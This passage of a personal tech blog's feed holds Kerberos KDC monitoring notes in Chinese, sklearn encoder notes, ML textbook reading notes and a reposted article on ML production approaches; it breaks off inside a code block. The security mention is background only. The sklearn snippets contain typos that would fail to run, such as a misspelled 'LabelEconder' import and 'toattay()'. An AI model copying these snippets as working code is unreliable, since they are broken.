数组中。更新的过程不受锁等待更新的影响，KDC对监控打点的调用仅仅是内存块中的更新，对服务的影响几乎可以忽略不计。相比其他方式，在实现上也更加简单、易理解。</p></li><li><p>纪录每个KDC进程的服务情况，便于准确查看每个进程的对请求的处理情况，有助于定位问题多种情况下出现的异常，缩短故障的定位时间。例如：能够准确的反应出每个进程的请求分布是否均匀、请求处理出现异常能够定位到具体是某个进程出现异常还是整体均有异常。</p><p>KDC监控设计的整体架构：</p></li></ol><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6oip712j21v80y2wlc.jpg" alt></p><p><strong>B.程序的可拓展性</strong></p><p>任何指标的采集都是随着需求进行变更的，如果程序设计上不具有良好的扩展性，会后续的指标扩展带来很大的困扰。第一版KDC监控指标的采集只区分请求的成功与失败两种类型，美团数据平台KDC库中所有的keytab都具有PREAUTH属性。根据上文可知，去掉PREAUTH属性后，AS请求的QPS能够提升一倍。后续随着服务规模的进一步增长，如果AS请求的处理能力逐步成为瓶颈，会考虑去掉PREAUTH属性。为了准确监控去掉PREAUTH属性这一过程是否有、有多少请求出现错误，需要扩展一个监控指标，因此有了KDC监控的第二版。整个过程只需要修改三个地方，完成两个功能的实现：</p><ol><li>添加指标 ；</li><li>打点逻辑的添加。</li></ol><p>整个修改过程简单明了，因此，该KDC监控程序的设计具有非常好的扩展性。图12为监控指标的罗列和注释：</p><p>KDC监控指标及含义：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6pmygs4j21440ri7d2.jpg" alt></p><p><strong>C.接口工具kstat的设计</strong></p><p>获取KDC监控指标的接口工具主要分为两种：</p><ol><li>获取当前每个KDC进程对各个指标的累积值，该功能是为了和新美大的监控平台Falcon结合，方便实现指标的上报实现累加值和分钟级别速率值的处理；</li><li>获取制定次数在制定时间间隔内每个进程监控指标的瞬时速率，最小统计间隔可达秒级，方便运维人员登陆机器无延迟的查看当前KDC的服务情况，使其在公司监控系统不可用的情况下分析服务的当前问题。具体使用见下图。</li></ol><p>kstat的使用帮助和两种功能使用样例：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6qjmveyj21s60len2w.jpg" alt></p><p><strong>总结：</strong></p><p>通过本次对KDC服务的压测实验和分析，总结出KDC最优性能的调整方案为：</p><ol><li>KDC服务本身需要开启多进程和以充分利用多核机器的CPU资源，同时确保BDB的内存资源足够，保证其缓存命中率达到一定比例（越高越好，否则查询库会带来大量的磁盘读IO）；</li><li>选择的物理机要做RAID，否则在库中keytab带有PREAUTH属性的条件下，会带来大量的写，容易导致磁盘成为KDC的性能瓶颈。通过建立一块共享内存无锁的实现了KDC多进程指标的收集，加上其良好的扩展性和数据的精确性，极大的提高了KDC服务的可靠性。</li></ol><p>相比原来线上单进程的处理能力，目前单台服务器的处理性能提升10+倍以上。本次工作没有详细的论述TCP协议中半队列、全队列的相关参数应该如何设定才能达到最优，和服务本身结合到一起，每个参数的变更带来的影响具体是什么因为过于复杂，还没有介绍。</p><hr><p><a href="https://tech.meituan.com/2019/02/14/data-security-platform-construction-practice-jiangjunling.html" target="_blank" rel="noopener">美团数据安全平台建设实践</a>  介绍了权限模型和解决方案等</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从18年底开始，公司的服务器经常受到各种挖矿脚本病毒的公司，Java后端Redis漏洞层出不穷，Hadoop这边MR的提交权限BUG也被利用了，于是决定调研Kerberos，发现Kerberos是一个巨大的坑，在此记录下笔记，作为我的Github Pages第一篇文档，希望后来人少走弯路。此文可能分为几次更新。&lt;/p&gt;
&lt;p&gt;第一次更新：2019-4-29&lt;/p&gt;
&lt;p&gt;第二次更新：2019-5-10&lt;/p&gt;
    
    </summary>
    
      <category term="Hadoop" scheme="http://yoursite.com/categories/Hadoop/"/>
    
      <category term="Security" scheme="http://yoursite.com/categories/Hadoop/Security/"/>
    
    
      <category term="Kerberos" scheme="http://yoursite.com/tags/Kerberos/"/>
    
  </entry>
  
  <entry>
    <title>LabelEnconder 和 OneHotEncoder</title>
    <link href="http://yoursite.com/2020/03/09/LabelEnconder/"/>
    <id>http://yoursite.com/2020/03/09/LabelEnconder/</id>
    <published>2020-03-09T10:03:40.229Z</published>
    <updated>2019-05-09T06:42:45.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>不得不说 我还是小看了ML的知识涉及的广度<br>光是ML 100days 的第一天其实涉及的内容就非常多<br>从Sklearn包到pycharm自带的各种BUG都搞的人头大</p><p>总算把这个整的有点明白了</p></blockquote><a id="more"></a> <h3 id="LabelEnconder"><a href="#LabelEnconder" class="headerlink" title="LabelEnconder"></a>LabelEnconder</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> LabelEconder</span><br><span class="line">y = data.iloc[:.<span class="number">-1</span>] <span class="comment"># 索引所有的行 最后一列</span></span><br><span class="line"><span class="comment"># 三步</span></span><br><span class="line">le = LabelEnconder() <span class="comment"># 实例化</span></span><br><span class="line">le = le.fit(y) <span class="comment"># 导入数据</span></span><br><span class="line">label = le.transform(y) <span class="comment"># trasform就扣调取结果</span></span><br><span class="line"><span class="comment"># 这边fit了之后可以直接用le.classes_ 查看标签中有多少类别</span></span><br><span class="line">le.classes_</span><br><span class="line"><span class="comment"># 输出 array(['No','Unknown','Yes'],dtype=object)</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 也可以直接fit_transform()一步到位</span></span><br><span class="line">le.fit_transform(y)</span><br><span class="line"><span class="comment"># 这样看不到属性</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从上到下一步到位</span></span><br><span class="line">data.iloc[: , <span class="number">-1</span>] = LabelEncoder().fit_transform(data.iloc[: , <span class="number">-1</span>])</span><br><span class="line"><span class="comment"># 实例化、fit transform 全部完成</span></span><br></pre></td></tr></table></figure><h3 id="OneHotEncoder"><a href="#OneHotEncoder" class="headerlink" title="OneHotEncoder"></a>OneHotEncoder</h3><p>遇到互相不相关的属性，为了避免模型训练的时候把欧式距离计算进去，对结果造成影响<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> OneHotEncoder</span><br><span class="line">X = data.iloc[:,<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">enc = OneHotEncoder(categories=<span class="string">'auto'</span>).fit(X)</span><br><span class="line">result = enc.transform(X).toarray()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 任然可以一步到位</span></span><br><span class="line">OneHotEncoder(categories=<span class="string">'auto'</span>).fit_transform(X).toattay()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同时这个数值还可以还原</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">pd.DataFrame(enc.inverse_transform(result))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当被哑变量（Onehot）之后，需要一个借口来查看每列的意义</span></span><br><span class="line">enc.get_feature_names()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还有 concat 方法可以将两个表相连</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;不得不说 我还是小看了ML的知识涉及的广度&lt;br&gt;光是ML 100days 的第一天其实涉及的内容就非常多&lt;br&gt;从Sklearn包到pycharm自带的各种BUG都搞的人头大&lt;/p&gt;
&lt;p&gt;总算把这个整的有点明白了&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Mechine-Learning/"/>
    
    
      <category term="sklearn" scheme="http://yoursite.com/tags/sklearn/"/>
    
      <category term="OneHotEncoder" scheme="http://yoursite.com/tags/OneHotEncoder/"/>
    
      <category term="LabelEncoder" scheme="http://yoursite.com/tags/LabelEncoder/"/>
    
  </entry>
  
  <entry>
    <title>Machine Learning</title>
    <link href="http://yoursite.com/2020/03/09/Machine%20Learning/"/>
    <id>http://yoursite.com/2020/03/09/Machine Learning/</id>
    <published>2020-03-09T10:03:40.075Z</published>
    <updated>2019-05-10T06:59:57.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>周志华的同名书籍的阅读笔记，入门读物</p></blockquote><a id="more"></a> <h2 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h2><h3 id="1-1-引言"><a href="#1-1-引言" class="headerlink" title="1.1 引言"></a>1.1 引言</h3><h3 id="1-2-基本术语"><a href="#1-2-基本术语" class="headerlink" title="1.2 基本术语"></a>1.2 基本术语</h3><p>classification：预测结果是离散值（好瓜、坏瓜）</p><p>regression：预测结果是连续值（成熟度0.95 0.37）</p><p>binary classification：只涉及两个结果的分类，通常称之为一个为positive class 一个为 negative class</p><p>multi-class classification：多分类</p><p>预测任务是希望通过训练对训练集{(x<sub>1</sub>,y<sub>1</sub>),(x<sub>2</sub>,y<sub>2</sub>)…(x<sub>m</sub>,y<sub>m</sub>)}进行学习，建议一个从输入空间X到输出空间Y的映射，对于二分类任务，通常另Y = {-1,1}或者{0,1}，对多分类任务，|Y|&gt;2，回归任务，Y = R，R是实数集。</p><p>学习完毕模型后，使用其预测的过程叫做测试(testing)，被预测的样本称为“测试样本”(testing sample)，例如在学得f之后，对测视例x，可得到其预测目标y = f(x).</p><p>聚类（clustering），即将训练集中的西瓜分为若干组（cluster），在聚类学习中，分的类我们是事先不知道的，学习过程中使用的训练样本通常不配拥有标记信息。</p><p>根据训练数据是否用哦与标记信息，学习任务大致可以划分为两大类：“监督学习（supervised learning）和非监督学习（unsupervised learning），分类和回归是前者的代表，聚类是后者的代表”</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;周志华的同名书籍的阅读笔记，入门读物&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Reading-notes/Mechine-Learning/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/tags/Mechine-Learning/"/>
    
  </entry>
  
  <entry>
    <title>将机器学习模型应用入生产的几种策略</title>
    <link href="http://yoursite.com/2020/03/09/Overview%20of%20the%20different%20approaches%20to%20putting%20Machine%20Learning%20(ML)%20models%20in%20production/"/>
    <id>http://yoursite.com/2020/03/09/Overview of the different approaches to putting Machine Learning (ML) models in production/</id>
    <published>2020-03-09T10:03:39.965Z</published>
    <updated>2019-05-20T19:57:56.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>原文 <a href="https://medium.com/analytics-and-data/overview-of-the-different-approaches-to-putting-machinelearning-ml-models-in-production-c699b34abf86" target="_blank" rel="noopener"><overview of the different approaches to putting machine learning (ml) models in production></overview></a></p></blockquote><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wmih501j20m80fwmzi.jpg" alt></p><a id="more"></a> <p>There are different approaches to putting models into productions, with benefits that can vary dependent on the specific use case. Take for example the use case of churn prediction, there is value in having a static value already that can easily be looked up when someone call a customer service, but there is some extra value that could be gained if for specific events, the model could be re-run with the newly acquired information.</p><p>There is generally different ways to both train and server models into production:</p><ul><li><strong>Train</strong>: one off, batch and real-time/online training</li><li><strong>Serve:</strong> Batch, Realtime (Database Trigger, Pub/Sub, web-service, inApp)</li></ul><p>Each approach having its own set of benefits and tradeoffs that need to be considered.</p><h3 id="One-off-Training"><a href="#One-off-Training" class="headerlink" title="One off Training"></a>One off Training</h3><p>Models don’t necessarily need to be continuously trained in order to be pushed to production. Quite often a model can be just trained ad-hoc by a data-scientist, and pushed to production until its performance deteriorates enough that they are called upon to refresh it.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wn761fzj209m09tq63.jpg" alt></p><blockquote><p>From Jupyter to Prod</p></blockquote><p>DataScientists prototyping and doing machine learning tend to operate in their environment of choice <a href="https://jupyter.org/" target="_blank" rel="noopener">Jupyter</a> Notebooks. Essentially an advanced GUI on a <a href="https://en.wikipedia.org/wiki/Read–eval–print_loop" target="_blank" rel="noopener">repl</a>, that allows you to save both code and command outputs.</p><p>Using that approach it is more than feasible to push an ad-hoc trained model from some piece of code in Jupyter to production. Different types of libraries and other notebook providers help further tie the link between the data-scientist workbench and production.</p><h4 id="Model-Format"><a href="#Model-Format" class="headerlink" title="Model Format"></a>Model Format</h4><p><a href="https://docs.python.org/3/library/pickle.html" target="_blank" rel="noopener">Pickle</a> converts a python object to to a bitstream and allows it to be stored to disk and reloaded at a later time. It is provides a good format to store machine learning models provided that their intended applications is also built in python.</p><p><a href="https://github.com/onnx" target="_blank" rel="noopener">ONNX</a> the Open Neural Network Exchange format, is an open format that supports the storing and porting of predictive model across libraries and languages. Most deep learning libraries support it and sklearn also has a library extension to convert their model to <a href="https://github.com/onnx/sklearn-onnx/blob/master/docs/tutorial.rst" target="_blank" rel="noopener">ONNX’s format</a>.</p><p><a href="https://en.wikipedia.org/wiki/Predictive_Model_Markup_Language" target="_blank" rel="noopener">PMML</a> or Predictive model markup language, is another interchange format for predictive models. Like for ONNX sklearn also has another library extension for converting the models to <a href="https://github.com/jpmml/sklearn2pmml" target="_blank" rel="noopener">PMML format</a>. It has the drawback however of only supporting certain type of prediction models.PMML has been around since 1997 and so has a large footprint of applications leveraging the format. Applications such as <a href="https://archive.sap.com/kmuuid2/a07faefd-61d7-2c10-bba6-89ac5ffc302c/Integrating Real-time Predictive Analytics into SAP Applications.pdf" target="_blank" rel="noopener">SAP</a> for instance is able to leverage certain versions of the PMML standard, likewise for CRM applications such as <a href="https://community.pega.com/knowledgebase/supported-pmml-model-types" target="_blank" rel="noopener">PEGA</a>.</p><p><a href="http://docs.h2o.ai/h2o/latest-stable/h2o-docs/productionizing.html#about-pojos-and-mojos" target="_blank" rel="noopener">POJO and MOJO </a>are <a href="https://www.h2o.ai/" target="_blank" rel="noopener">H2O.ai</a>’s export format, that intendeds to offers an easily embeddable model into java application. They are however very specific to using the H2O’s platform.</p><h4 id="Training"><a href="#Training" class="headerlink" title="Training"></a>Training</h4><p>For one off training of models, the model can either be trained and fine tune adhoc by a data-scientists or training through AutoML libraries. Having an easily reproducible setup, however helps pushing into the next stage of productionalization, ie: batch training.</p><h3 id="Batch-Training"><a href="#Batch-Training" class="headerlink" title="Batch Training"></a>Batch Training</h3><p>While not fully necessary to implement a model in production, batch training allows to have a constantly refreshed version of your model based on the latest train.</p><p>Batch training can benefit a-lot from AutoML type of frameworks, AutoML enables you to perform/automate activities such as feature processing, feature selection, model selections and parameter optimization. Their recent performance has been on par or bested the most diligent data-scientists.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wnpy6yjj20m80gntax.jpg" alt></p><p>Using them allows for a more comprehensive model training than what was typically done prior to their ascent: simply retraining the model weights.</p><p>Different technologies exists that are made to support this continuous batch training, these could for instance be setup through a mix of <a href="https://medium.com/analytics-and-data/airflow-the-easy-way-f1c26859ee21" target="_blank" rel="noopener">airflow</a> to manage the different workflow and an AutoML library such as <a href="https://epistasislab.github.io/tpot/" target="_blank" rel="noopener">tpot</a>, Different cloud providers offer their solutions for AutoML that can be put in a data workflow. Azure for instance integrates machine learning prediction and model training with their <a href="https://azure.microsoft.com/es-es/blog/retraining-and-updating-azure-machine-learning-models-with-azure-data-factory/" target="_blank" rel="noopener">data factory offering</a>.</p><h3 id="Real-time-training"><a href="#Real-time-training" class="headerlink" title="Real time training"></a>Real time training</h3><p>Real-time training is possible with ‘Online Machine Learning’ models, algorithms supporting this method of training includes K-means (through mini-batch), Linear and Logistic Regression (through Stochastic Gradient Descent) as well as Naive Bayes classifier.</p><p>Spark has StreamingLinearAlgorithm/StreamingLinearRegressionWithSGD to perform these operations, sklearn has SGDRegressor and SGDClassifier that can be incrementally trained. In sklearn, the incremental training is done through the partial_fit method as shown below:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">X_0 = pd.DataFrame([[<span class="number">0</span>,<span class="number">0</span>], [<span class="number">1</span>,<span class="number">0</span>]] )</span><br><span class="line">y_0 = pd.DataFrame([[<span class="number">0</span>], [<span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line">X_1 = pd.DataFrame([[<span class="number">0</span>,<span class="number">1</span>], [<span class="number">1</span>,<span class="number">1</span>], [<span class="number">1</span>,<span class="number">1</span>]])</span><br><span class="line">y_1 = pd.DataFrame([[<span class="number">1</span>], [<span class="number">1</span>], [<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line">clf = linear_model.SGDClassifier()</span><br><span class="line"></span><br><span class="line">clf.partial_fit(X_0, y_0, classes=[<span class="number">0</span>,<span class="number">1</span>])</span><br><span class="line">print(clf.predict([[<span class="number">0</span>,<span class="number">0</span>]])) <span class="comment"># -&gt; 0</span></span><br><span class="line">print(clf.predict([[<span class="number">0</span>,<span class="number">1</span>]])) <span class="comment"># -&gt; 0</span></span><br><span class="line"></span><br><span class="line">clf.partial_fit(X_1, y_1, classes=[<span class="number">0</span>,<span class="number">1</span>])</span><br><span class="line">print(clf.predict([[<span class="number">0</span>,<span class="number">0</span>]])) <span class="comment"># -&gt; 0</span></span><br><span class="line">print(clf.predict([[<span class="number">0</span>,<span class="number">1</span>]])) <span class="comment"># -&gt; 1</span></span><br></pre></td></tr></table></figure><p>When deploying this type of models there needs to be serious operational support and monitoring as the model can be sensitive to new data and noise, and model performance needs to be monitored on the fly. In offline training, you can filter points of <a href="https://en.wikipedia.org/wiki/Leverage_(statistics" target="_blank" rel="noopener">high leverage</a>) and correct for this type of incoming data. This is much harder to do when you are constantly updating your model training based on a stream of new data points.</p><p>Another challenge that occurs with training online model is that they don’t decay historical information. This means that, on case there are structural changes in your datasets, the model will need to be anyway re-trained and that there will be a big onus in model lifecycle management.</p><h3 id="Batch-vs-Real-time-Prediction"><a href="#Batch-vs-Real-time-Prediction" class="headerlink" title="Batch vs. Real-time Prediction"></a>Batch vs. Real-time Prediction</h3><p>When looking at whether to setup a batch or real-time prediction, it is important to get an understanding of why doing real-time prediction would be important. It can potentially be for getting a new score when significant event happen, for instance what would be the churn score of customer when they call a contact center. These benefits needs to be weighted against the complexity and cost implications that arise from doing real-time predictions.</p><p><strong>Load implications</strong></p><p>Catering to real time prediction, requires a way to handle peak load. Depending on the approach taken and how the prediction ends up being used, choosing a real-time approach, might also require to have machine with extra computing power available in order to provide a prediction within a certain SLA. This contrasts with a batch approach where the predictions computing can be spread out throughout the day based on available capacity.</p><p><strong>Infrastructure Implications</strong></p><p>Going for real-time, put a much higher operational responsibility. People need to be able to monitor how the system is working, be alerted when there is issue as well as take some consideration with respect to failover responsibility. For batch prediction, the operational obligation is much lower, some monitoring is definitely needed, and altering is desired but the need to be able to know of issues arising directly is much lower.</p><p><strong>Cost Implications</strong></p><p>Going for real-time predictions also has costs implications, going for more computing power, not being able to spread the load throughout the day can force into purchasing more computing capacity than you would need or to pay for spot price increase. Depending on the approach and requirements taken there might also be extra cost due to needing more powerful compute capacity in order to meet SLAs. Furthermore, there would tend to be a higher infrastructure footprint when choosing for real time predictions. One potential caveat there is where the choice is made to rely on in app prediction, for that specific scenario the cost might actually end up being cheaper than going for a batch approach.</p><p><strong>Evaluation Implications</strong></p><p>Evaluating the prediction performance in real-time manner can be more challenging than for batch predictions. How do you evaluate performance when you are faced with a succession of actions in a short burst producing multiple predictions for a given customer for instance? Evaluating and debugging real-time prediction models are significantly more complex to manage. They also require a log collection mechanism that allows to both collect the different predictions and features that yielded the score for further evaluation.</p><h3 id="Batch-Prediction-Integration"><a href="#Batch-Prediction-Integration" class="headerlink" title="Batch Prediction Integration"></a>Batch Prediction Integration</h3><p>Batch predictions rely on two different set of information, one is the predictive model and the other one is the features that we will feed the model. In most type of batch prediction architecture, ETL is performed to either fetch pre-calculated features from a specific datastore (feature-store) or performing some type of transformation across multiple datasets to provide the input to the prediction model. The prediction model then iterates over all the rows in the datasets providing the different score.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wou2v4sj20ja08d74l.jpg" alt></p><p>Once all the predictions have been computed, we can then “serve” the score to the different systems wanting to consume the information. This can be done in different manner depending on thee use case for which we want to consume the score, for instance if we wanted to consume the score on a front-end application, we would most likely push the data to a “cache” or NoSQL database such as Redis so that we can offer milliseconds responses, while for certain use cases such as the creation of an email journey, we might just be relying on a CSV SFTP export or a data load to a more traditional RDBMS.</p><h3 id="Real-time-Prediction-integration"><a href="#Real-time-Prediction-integration" class="headerlink" title="Real-time Prediction integration"></a><strong>Real-time Prediction integration</strong></h3><p>Being able to push model into production for real-time applications require 3 base components. A customer/user profile, a set of triggers and predictive models.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wp3or7dj20em02k3yg.jpg" alt></p><p><strong>Profile:</strong> The customer profile contains all the related attribute to the customer as well as the different attributes (eg: counters) necessary in order to make a given prediction. This is required for customer level prediction in order to reduce the latency of pulling the information from multiple places as well as to simplify the integration of machine learning models in productions. In most cases a similar type of data store would be needed in order to effectively fetch the data needed to power the prediction model.</p><p><strong>Triggers:</strong> Triggers are events causing the initiation of process, they can be for churn for instance, call to a customer service center, checking information within your order history, etc …</p><p><strong>Models:</strong> models need to have been pre-trained and typically exported to one of the 3 formats previously mentioned (pickle, ONNX or PMML) to be something that we could easily port to production.</p><p>There are quite a few different approach to putting models for scoring purpose in production:</p><ul><li><em>Relying on in Database integration:</em> a lot of database vendors have made a significant effort to tie up advanced analytics use cases within the database. Be it by direct integration of Python or R code, to the import of PMML model.</li><li><em>Exploiting a Pub/Sub model</em>: The prediction model is essentially an application feeding of a data-stream and performing certain operations, such as pulling customer profile information.</li><li><em>Webservice:</em> Setting up an API wrapper around the model prediction and deploying it as a web-service. Depending on the way the web-service is setup it might or might not do the pull or data needed to power the model.</li><li><em>inApp:</em> it is also possible to deploy the model directly into a native or web application and have the model be run on local or external datasources.</li></ul><h4 id="Database-integrations"><a href="#Database-integrations" class="headerlink" title="Database integrations"></a><em>Database integrations</em></h4><p>If the overall size of your database is fairly small (&lt; 1M user profile) and the update frequency is occasional it can make sense to integrate some of the real-time update process directly within the database.</p><p>Postgres possess an integration that allows to run Python code as functions or stored procedure called <a href="http://pl/Python" target="_blank" rel="noopener">PL/Python</a>. This implementation has access to all the libraries that are part of the <strong>PYTHONPATH</strong>, and as such are able to use libraries such as Pandas and SKlearn to run some operations.</p><p>This can be coupled with Postgres’ <a href="https://www.tutorialspoint.com/postgresql/postgresql_triggers.htm" target="_blank" rel="noopener">Triggers</a> Mechanism to perform a run of the database and update the churn score. For instance if a new entry is made to a complaint table, it would be valuable to have the model be re-run in real-time.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wpd8zz1j20f10b5q39.jpg" alt></p><p><strong>Sequence flow</strong></p><p>The flow could be setup in the following way:</p><p><em>New Event:</em> When a new row is inserted in the complain table, an event trigger is generated.</p><p><em>Trigger:</em> The trigger function would update the number of complaint made by this customer in the customer profile table and fetch the updated record for the customer.</p><p><em>Prediction Request:</em> Based on that it would re-run the churn model through PL/Python and retrieve the prediction.</p><p><em>Customer Profile Update:</em> It can then re-update the customer profile with the updated prediction. Downstream flows can then happen upon checking if the customer profile has been updated with new churn prediction value.</p><p><strong>Technologies</strong></p><p>Different databases are able to support the running of Python script, this is the case of PostGres which has a native Python integration as previosuly mentioned, but also of Ms SQL Server through its’ <a href="https://www.sqlshack.com/how-to-use-python-in-sql-server-2017-to-obtain-advanced-data-analytics/" target="_blank" rel="noopener">Machine Learning Service (in Database)</a>, other databases such as Teradata, are able to run R/Python script through an external script command. While Oracle supports <a href="https://docs.oracle.com/database/121/DMPRG/GUID-55C6ADBF-DA64-48B6-A424-5F0A59CD406D.htm#DMPRG701" target="_blank" rel="noopener">PMML model</a> through its data mining extension.</p><h4 id="Pub-Sub"><a href="#Pub-Sub" class="headerlink" title="Pub/Sub"></a>Pub/Sub</h4><p>Implementing real-time prediction through a pub/sub model allows to be able to properly handle the load through throttling. For engineers, it also means that they can just feed the event data through a single “logging” feed, to which different application can subscribe.</p><p>An example, of how this could be setup is shown below:</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wpl246sj20m8058aah.jpg" alt></p><p>The page view event is fired to a specific event topic, on which two application subscribe a page view counter, and a prediction. Both of these application filter out specific relevant event from the topic for their purpose and consume the different messages in the topics. The page view counter app, provides data to power a dashboard, while the prediction app, updates the customer profile.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wpsew6sj20fg08x74h.jpg" alt></p><p><strong>Sequence flow:</strong></p><p>Event messages are pushed to the pub/sub topic as they occur, the prediction app poll the topic for new messages. When a new message is retrieved by the prediction app, it will request and retrieve the customer profile and use the message and the profile information to make a prediction. which it will ultimately push back to the customer profile for further use.</p><p>A slightly different flow can be setup where the data is first consumed by an “enrichment app” that adds the profile information to the message and then pushes it back to a new topic to finally be consumed by the prediction app and pushed onto the customer profile.</p><p><strong>Technologies:</strong></p><p>The typical open source combination that you would find that support this kind of use case in the data ecosystem is a combination of Kafka and Spark streaming, but a different setup is possible on the cloud. On google notably a google pub-sub/dataflow (Beam) provides a good alternative to that combination, on azure a combination of Azure-Service Bus or Eventhub and Azure Functions can serve as a good way to consume the mesages and generate these predictions.</p><p><em>Web Service</em></p><p>We can implement models into productions as web-services. Implementing predictions model as web-services are particularly useful in engineering teams that are fragmented and that need to handle multiple different interfaces such as web, desktop and mobile.</p><p>Interfacing with the web-service could be setup in different way:</p><ul><li>either providing an identifier and having the web-service pull the required information, compute the prediction and return its’ value</li><li>Or by accepting a payload, converting it to a data-frame, making the prediction and returning its’ value.</li></ul><p>The second approach is usually recommended in cases, when there is a lot of interaction happening and a local cache is used to essentially buffer the synchronization with the backend systems, or when needing to make prediction at a different grain than a customer id, for instance when doing session based predictions.</p><p>The systems making use of local storage, tend to have a reducer function, which role is to calculate what would be the customer profile, should the event in local storage be integrated back. As such it provides an approximation of the customer profile based on local data.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wq0vsywj20ix0b5mxt.jpg" alt></p><p><strong>Sequence Flow</strong></p><p>The flow for handling the prediction using a mobile app, with local storage can be described in 4 phases.</p><p><em>Application Initialization (1 to 3)**</em>:** The application initializes, and makes a request to the customer profile, and retrieve its initial value back, and initialize the profile in local storage.</p><p><em>Applications (4):</em> The application stores the different events happening with the application into an array in local storage.</p><p><em>Prediction Preparation (5 to 8)**</em>:*<em> The application wants to retrieve a new churn prediction, and therefore needs to prepare the information it needs to provide to the Churn Web-service. For that, it makes an initial request to local storage to retrieve the values of the profile and the array of events it has stored. Once they are retrieve, it makes a request to a reducer function providing these values as arguments, the reducer function outputs an updated</em> profile with the local events incorporated back into this profile.</p><p><em>Web-service Prediction (9 to 10):</em> The application makes a request to the churn prediction web-service, providing the different the updated*/reduced customer profile from step 8 as part of the payload. The web-service can then used the information provided by the payload to generate the prediction and output its value, back to the application.</p><p><strong>Technologies</strong></p><p>There are quite a few technologies that can be used to power a prediction web-service:</p><p><em>Functions</em></p><p>AWS Lambda functions, Google Cloud functions and Microsoft Azure Functions (although Python support is currently in Beta) offer an easy to setup interface to easily deploy scalable web-services.</p><p>For instance on Azure a prediction web-service could be implemented through a function looking roughly like this:</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 